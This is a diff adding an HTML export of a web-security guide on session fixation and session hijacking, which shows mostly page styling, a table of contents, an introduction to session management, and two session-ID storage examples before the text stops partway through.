@@ -1,0 +1,1015 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Session Fixation and Session Hijacking - Comprehensive Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2cf562ad-76f0-803a-9c21-fe8cbcf4c8e8" class="page mono"><header><h1 class="page-title" dir="auto">Session Fixation and Session Hijacking<strong> - Comprehensive Guide</strong></h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2cf562ad-76f0-80d3-bcbc-dcea64d24036" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8051-8a64-fbdf894e9fdc"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8080-8c9f-ddc8ab921e01"><strong>What is Session Management</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-808e-a437-c333ae62cd6f"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-807f-9c25-fa6dc74125ed"><strong>How Sessions Work</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-802d-8ca0-d6b41b0810b9"><strong>Session ID Storage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8064-8796-c7e0d5756315"><strong>Session Hijacking</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8078-9bce-e32626e2e733"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80f8-95e2-eff8fd45443a"><strong>How Session Hijacking Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-802b-a161-cf139a3536d7"><strong>Attack Vectors</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8042-a65b-e2b9ce09ba25"><strong>Practical Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80fb-b6f0-f801a866e7b4"><strong>Session Fixation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a5-9235-cab19dba14c9"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c2-8a7a-d5dba565d081"><strong>How Session Fixation Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8036-920d-ee37da272dc3"><strong>Attack Methods</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80d5-8c01-dbdd912030cc"><strong>Practical Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8096-945d-d4dff9ebc7e5"><strong>Attack Vectors</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80b6-99e9-c879a8984464"><strong>Session Hijacking Attack Vectors</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-804f-8bc3-f6d2f73bce22"><strong>Session Fixation Attack Vectors</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a8-b43b-e0515bb2427b"><strong>Differences Between Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c2-8e74-c41bfd57532b"><strong>Comparison Table</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8044-b3af-dd69bbc235e7"><strong>Key Differences</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8026-9825-c62a480d66a3"><strong>Mitigations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8068-a458-cd7042fd6c4e"><strong>Mitigations for Session Hijacking</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-809b-baea-fa92ac3f1d61"><strong>Mitigations for Session Fixation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80b3-b8e0-fd031696b5ac"><strong>Mitigations for Session Fixation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c7-b7c3-c2d07d5083b3"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-809f-ba48-f5b61a4e4912"><strong>Session Security Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-807d-9031-eabd3ec20cd1"><strong>Implementation Examples</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-801a-81a0-fcf5afdc9d83"><strong>Secure Session Management (Node.js/Express)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80db-9717-cc1ee04671d0"><strong>Real-World Scenarios</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8065-b9ba-c582a5af915e"><strong>Scenario 1: Banking Application</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8075-9ad4-ed7671ec877d"><strong>Scenario 2: E-commerce Site</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-801b-a73d-f974da93026f"><strong>Scenario 3: Social Media Platform</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8084-a683-d7188fda1911"><strong>Summary</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80eb-a9f0-f206e620ace9"><strong>Key Points</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8077-b5e3-ca7a4e8c8d0f"><strong>Complete Mitigation Checklist</strong></a></div></nav></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8051-8a64-fbdf894e9fdc" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ac-b538-e30ef7a747fc" class="">Session fixation and session hijacking are security attacks targeting the session management mechanism of web applications. Both attacks aim to gain unauthorized access to user sessions, but they operate at different stages of the session lifecycle and use different techniques.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80d7-9669-d4b303d954ac" class=""><strong>Key Point:</strong> Understanding both attacks and their differences is crucial for implementing proper session security.</p></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-800c-9e3e-f9c2d2089ea6"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8080-8c9f-ddc8ab921e01" class=""><strong>What is Session Management</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-808e-a437-c333ae62cd6f" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-800e-804a-dea4deb347c3" class=""><strong>Session management</strong> is the process of maintaining user state across multiple HTTP requests. Since HTTP is stateless, web applications use sessions to track authenticated users.</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-807f-9c25-fa6dc74125ed" class=""><strong>How Sessions Work</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80ec-a2e0-e0c67221a536" class="numbered-list" start="1"><li><strong>User logs in</strong> → Server creates session</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8064-9af0-c68a74c58c50" class="numbered-list" start="2"><li><strong>Server generates session ID</strong> → Unique identifier</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80cd-b94e-f82eff0a1a61" class="numbered-list" start="3"><li><strong>Session ID sent to client</strong> → Cookie, URL, or form field</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80bf-939f-f58615a120f5" class="numbered-list" start="4"><li><strong>Client sends session ID</strong> → With each request</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-808c-8096-ed12ce1d8f1b" class="numbered-list" start="5"><li><strong>Server validates session ID</strong> → Retrieves session data</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-807b-9d90-c5b72c3c7dae" class="numbered-list" start="6"><li><strong>Session expires</strong> → After timeout or logout</li></ol></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-802d-8ca0-d6b41b0810b9" class=""><strong>Session ID Storage</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8020-acbf-e18ad3d16e57" class=""><strong>1. Cookies (Most Common):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-808f-b888-ce5529f9752c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-809a-b32f-ca9197a2d44e" class=""><strong>2. URL Parameters:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80d9-8b61-e942db0af624" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">https://example.com/page?sessionid=abc123
